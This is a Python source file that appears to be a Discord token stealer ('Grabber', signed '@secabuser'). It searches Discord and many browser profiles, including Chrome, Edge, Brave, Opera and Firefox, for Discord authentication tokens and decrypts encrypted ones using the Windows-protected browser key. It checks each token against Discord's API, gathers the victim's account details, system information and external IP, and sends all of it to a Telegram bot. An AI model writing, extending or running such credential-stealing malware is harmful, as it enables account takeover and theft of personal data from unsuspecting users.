import os
import re
import json
import base64
import sqlite3
import requests
import platform
import socket 
import psutil 
from pathlib import Path
from Crypto.Cipher import AES
from typing import Dict, Set, Tuple, Optional, List

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Scout:
    def __init__(self):
        self.found: Set[Tuple[str, str]] = set()
        self.link = self.init_link()

    def init_link(self) -> requests.Session:
        ses = requests.Session()
        ses.verify = False 
        ses.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        return ses

    def check(self, data: str) -> bool:
        return bool(re.match(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', data))

    def run(self) -> Set[Tuple[str, str]]:
        raise NotImplementedError

class Chrome(Scout):
    def __init__(self):
        super().__init__()
        self.paths = self.get_paths()
        
    def get_paths(self) -> Dict[str, Path]:
        loc = Path(os.getenv('LOCALAPPDATA', ''))
        roam = Path(os.getenv('APPDATA', ''))

        roots = {
            'Dsc': roam / 'Discord',
            'DscCanary': roam / 'discordcanary',
            'DscPTB': roam / 'discordptb',
            'Chr': loc / 'Google' / 'Chrome' / 'User Data',
            'Edg': loc / 'Microsoft' / 'Edge' / 'User Data',
            'Brv': loc / 'BraveSoftware' / 'Brave-Browser' / 'User Data',
            'Opr': roam / 'Opera Software' / 'Opera Stable',
            'OprGX': roam / 'Opera Software' / 'Opera GX Stable',
            'Yndx': loc / 'Yandex' / 'YandexBrowser' / 'User Data',
            'Vival': loc / 'Vivaldi' / 'User Data',
            'Chrom': loc / 'Chromium' / 'User Data',
            'Epic': loc / 'Epic Privacy Browser' / 'User Data',
            'Slim': loc / 'Slimjet' / 'User Data',
            'UC': loc / 'UCBrowser' / 'User Data',
            'Cmo': loc / 'Comodo' / 'Dragon' / 'User Data',
            'Fx': roam / 'Mozilla' / 'Firefox' / 'Profiles'
        }
        return {name: path for name, path in roots.items() if path.exists()}

    def get_key(self, path: Path) -> Optional[bytes]:
        if platform.system() != "Windows":
            return None
        
        try:
            with open(path / 'Local State', 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            b64_key = data['os_crypt']['encrypted_key']
            raw_key = base64.b64decode(b64_key)[5:]
            
            import win32crypt
            key = win32crypt.CryptUnprotectData(raw_key, None, None, None, 0)[1]
            return key
        except:
            return None

    def dec(self, enc_data: bytes, key: bytes) -> Optional[str]:
        try:
            iv = enc_data[3:15]
            txt = enc_data[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            dec_txt = cipher.decrypt(txt)
            return dec_txt.decode('utf-8')
        except:
            return None

    def scan_db(self, db_path: Path, name: str, key: Optional[bytes]):
        for file in db_path.glob('*.[l|m]db'):
            try:
                with open(file, 'r', errors='ignore') as f:
                    content = f.read()
                    
                    for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content):
                        if self.check(token):
                            self.found.add((token, name))
                            
                    for match in re.finditer(r'dQw4w9WgXcQ:[^\"]+', content):
                        enc = match.group().split('dQw4w9WgXcQ:')[1]
                        if key:
                            try:
                                dec = self.dec(base64.b64decode(enc), key)
                                if dec and self.check(dec):
                                    self.found.add((dec, name))
                            except:
                                pass
            except:
                continue

    def run(self) -> Set[Tuple[str, str]]:
        for name, path in self.paths.items():
            if name == 'Fx':
                continue

            if not path.exists():
                continue
            
            key = self.get_key(path)

            if name in ['Dsc', 'DscCanary', 'DscPTB']:
                db_path = path / 'Local Storage' / 'leveldb'
                if db_path.exists():
                    self.scan_db(db_path, name, key)
            else:
                profiles = ['Default'] + [d.name for d in path.iterdir() if d.is_dir() and d.name.startswith('Profile')]
                for prof in profiles:
                    db_path = path / prof / 'Local Storage' / 'leveldb'
                    if db_path.exists():
                        self.scan_db(db_path, f"{name} ({prof})", key)
        return self.found

class Fox(Scout):
    def __init__(self):
        super().__init__()
        self.root = Path(os.getenv('APPDATA', '')) / 'Mozilla' / 'Firefox' / 'Profiles'

    def dec_fox(self, data: bytes) -> Optional[str]:
        return None

    def get_cookies(self, path: Path) -> Set[Tuple[str, str]]:
        res = set()
        db_path = path / 'cookies.sqlite'
        if not db_path.exists():
            return res

        try:
            conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT value FROM moz_cookies 
                WHERE host LIKE '%discord.com%' 
                AND (name LIKE '%token%' OR name LIKE '%auth%')
            """)
            for row in cursor.fetchall():
                token = row[0]
                if self.check(token):
                    res.add((token, "Firefox"))
                    
            conn.close()
        except sqlite3.Error:
            pass
        return res

    def get_local(self, path: Path) -> Set[Tuple[str, str]]:
        res = set()
        
        for file in path.rglob('*'):
            if file.is_file() and file.suffix in ['.sqlite', '.json', '.txt', '.log']:
                try:
                    with open(file, 'r', errors='ignore') as f:
                        content = f.read()
                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content):
                            if self.check(token):
                                res.add((token, "Firefox"))
                except:
                    pass
        return res

    def run(self) -> Set[Tuple[str, str]]:
        if not self.root.exists():
            return self.found

        for prof in self.root.iterdir():
            if prof.is_dir() and (prof.name.endswith('.default-release') or prof.name.endswith('.default')):
                self.found.update(self.get_cookies(prof))
                self.found.update(self.get_local(prof))
        return self.found

class Grabber:
    def __init__(self, key: str, chat: str):
        self.key = key
        self.chat = chat
        self.s = self.get_ses()
        self.tokens: Set[Tuple[str, str]] = set()

    def get_ses(self) -> requests.Session:
        ses = requests.Session()
        ses.verify = False 
        ses.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        return ses

    def get_info(self, token: str) -> Optional[Dict]:
        head = {'Authorization': token}
        try:
            res = self.s.get('https://discord.com/api/v9/users/@me', headers=head, timeout=10)
            res.raise_for_status()
            return res.json()
        except requests.exceptions.RequestException:
            return None

    def get_ip(self) -> str:
        try:
            res = self.s.get('https://api.ipify.org', timeout=5)
            return res.text
        except requests.exceptions.RequestException:
            return "Undetectable"

    def get_sys(self) -> str:
        user = os.getenv('USERNAME') or os.getenv('USER') or "Unknown"
        host = socket.gethostname() or "Unknown Host"
        os_det = f"{platform.system()} {platform.release()} ({platform.version()})"
        arch = platform.machine()
        proc = platform.processor()
        
        try:
            ram_stats = psutil.virtual_memory()
            ram_gb = round(ram_stats.total / (1024**3), 2)
            ram_str = f"{ram_gb} GB"
        except Exception:
            ram_str = "N/A"

        try:
            cpu_per = psutil.cpu_percent(interval=1) 
            cpu_cnt = psutil.cpu_count(logical=True)
            cpu_sum = f"{cpu_cnt} Cores ({cpu_per}%)"
        except Exception:
            cpu_sum = "N/A"

        ip = self.get_ip()

        msg = (
            f"<b>User:</b> {user}\n"
            f"<b>Win:</b> {os_det}\n"
            f"<b>Type:</b> {arch}\n"
            f"<b>Cpu:</b> {proc}\n"
            f"<b>Memory:</b> {ram_str}\n"
            f"<b>Cpu-Load:</b> {cpu_sum}\n"
            f"<b>External-IP:</b> {ip}\n"
            f"━━━━━━━━━━━━━━━━━━"
            f"\n// @secabuser \\\\"
        )
        return msg

    def send(self, content: str) -> bool:
        url = f'https://api.telegram.org/bot{self.key}/sendMessage'
        payload = {
            'chat_id': self.chat,
            'text': content,
            'parse_mode': 'HTML'
        }
        try:
            res = self.s.post(url, json=payload, timeout=10)
            res.raise_for_status()
            return True
        except requests.exceptions.RequestException:
            return False

    def exec(self):
        chrome_pipe = Chrome()
        self.tokens.update(chrome_pipe.run())

        fox_pipe = Fox()
        self.tokens.update(fox_pipe.run())
        
        if not self.tokens:
            self.send("<b>// No Discord credentials detected. Mission completed with no findings.</b>\n━━━━━━━━━━━━━━━━━━\n// @secabuser \\\\")
        else:
            for token, source in self.tokens:
                details = self.get_info(token)
                if details:
                    report = (
                        f"<b>// New Acc \\\\</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"<b>Source:</b> {source}\n"
                        f"<b>UserName:</b> {details.get('username', 'N/A')}#{details.get('discriminator', '0000')}\n"
                        f"<b>AccId:</b> <code>{details.get('id', 'N/A')}</code>\n"
                        f"<b>Email:</b> {details.get('email', 'N/A')}\n"
                        f"<b>Phone:</b> {details.get('phone', 'N/A')}\n"
                        f"<b>Loc:</b> {details.get('locale', 'N/A')}\n"
                        f"<b>2FA Status:</b> {'✅ Enabled' if details.get('mfa_enabled') else '❌ Disabled'}\n"
                        f"<b>Token:</b>\n<code>{token}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"// @secabuser \\\\"
                    )
                    self.send(report)
                else:
                    invalid_report = (
                        f"<b>// Discord Credential (Inactive/Invalid) \\\\</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"<b>Invalid Token:</b>\n<code>{token}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"// @secabuser \\\\"
                    )
                    self.send(invalid_report)
        
        sys_report = f"<b>User:</b> {os.getenv('USERNAME') or os.getenv('USER') or 'Unknown'}\n" + self.get_sys().lstrip("━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        self.send(sys_report)


if __name__ == '__main__':
    TELE_KEY = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE") 
    CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID_HERE") 

    main_grabber_instance = Grabber(TELE_KEY, CHAT_ID)
    main_grabber_instance.exec()
